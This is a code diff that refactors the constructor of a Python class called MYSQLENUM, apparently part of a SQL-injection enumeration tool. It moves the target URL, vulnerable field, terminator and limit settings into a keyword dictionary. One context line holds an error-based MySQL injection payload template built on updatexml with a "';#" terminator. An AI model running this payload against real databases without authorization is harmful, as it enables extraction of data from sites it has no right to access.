@@ -31,15 +31,23 @@ enum_logger = colorlog.getLogger('MYSQLENUM')
 
 class MYSQLENUM():
     
-    def __init__(self, target_url, data, vuln_field, table_limit, debug, request_type, terminator="';#"):
-
-        self.target_url = target_url
-        self.data = data
-        self.vuln_field = vuln_field
+    def __init__(self, kwargs={}):
+        
+        self.target_url = kwargs['target_url']
+        self.data = kwargs['data']
+        self.vuln_field = kwargs['vuln_field']
         
         self.table_limit = ""
+
+        if kwargs['table_limit']:
+            
+            self.table_limit = " limit " + kwargs['table_limit']
+            
+        self.terminator = kwargs['terminator'] if (kwargs['terminator'] is not None) else "';#"
         
-        self.debug = debug
+        self.request_type = kwargs['request_type']
+        
+        self.debug = kwargs['debug']
         
         self.debug_levels = {'d':logging.DEBUG,
                             'w':logging.WARNING,
@@ -48,16 +56,6 @@ class MYSQLENUM():
                             'c':logging.CRITICAL}
         
         self.set_debug_level()
-        
-        self.terminator = terminator
-        
-        self.request_type = request_type
-        
-        
-        
-        if table_limit:
-            
-            self.table_limit = " limit " + table_limit
         
         self.sqli = "1' and updatexml(1, concat(0x7e, (~payload~)), 0) and '1" + self.terminator
         
@@ -91,11 +89,11 @@ class MYSQLENUM():
         
         params = {}
         
-        params['url'] = self.target_url
+        params['target_url'] = self.target_url
         params['data'] = self.data
         params['request_type'] = self.request_type
         params['vuln_field'] = self.vuln_field
-        params['limit'] = self.table_limit
+        params['table_limit'] = self.table_limit
         params['terminator'] = self.terminator
         params['debug'] = self.debug
         
